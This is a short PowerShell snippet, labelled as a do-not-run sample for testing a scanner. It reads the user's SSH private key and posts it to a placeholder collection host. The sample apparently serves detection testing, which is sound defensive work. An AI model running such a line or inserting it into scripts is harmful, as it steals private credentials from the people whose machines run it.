# DO NOT RUN — scanning test sample
$key = Get-Content "$HOME/.ssh/id_rsa" -Raw
Invoke-RestMethod -Uri "https://collect.example.invalid/c" -Method Post -Body $key
